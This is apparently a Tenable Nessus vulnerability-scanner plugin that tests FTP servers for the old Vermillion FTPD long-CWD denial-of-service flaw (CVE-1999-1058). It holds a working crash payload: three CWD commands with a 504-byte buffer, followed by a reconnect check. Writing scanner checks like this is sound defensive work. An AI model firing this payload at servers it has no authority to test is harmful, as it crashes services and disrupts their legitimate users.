#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10293);
 script_bugtraq_id(818);
 script_version ("$Revision: 1.26 $");
 script_cve_id("CVE-1999-1058");
 script_xref(name:"OSVDB", value:"9834");
 
 script_name(english:"Vermillion FTPD Long CWD Commands DoS");
	     
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a
denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote FTP server crash
by issuing the commands :

	CWD <buffer>
	CWD <buffer>
	CWD <buffer>

Where <buffer> is longer than 504 chars.	

An attacker can use this problem to prevent your FTP server
from working properly, thus preventing legitimate
users from using it." );
 script_set_attribute(attribute:"solution", value:
"upgrade your FTP to the latest version, 
or change it." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
		 
script_end_attributes();

		    
 
 script_summary(english:"Checks if the remote ftp can be buffer overflown");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
		  
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#

include("global_settings.inc");
include('ftp_func.inc');

if (report_paranoia < 2) exit(0);

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

if(!login)exit(0);



port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(!get_port_state(port))exit(0);
banner = get_ftp_banner(port:port);
if ( ! banner || "vftp" >!< tolower(banner)) exit(0);
# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
 domain = ereg_replace(pattern:"[^\.]*\.(.*)",
 		       string:get_host_name(),
		       replace:"\1");	
		       
 if(ftp_authenticate(socket:soc, user:"anonymous", pass:string("nessus@", domain)))
 {
  crp = crap(504);
  c = string("CWD ", crp, "\r\n");
  send(socket:soc, data:c) x 3;
  close(soc);
  soc2 = open_sock_tcp(port);
  if(!soc2)security_warning(port);
  else close(soc2);
 }
}
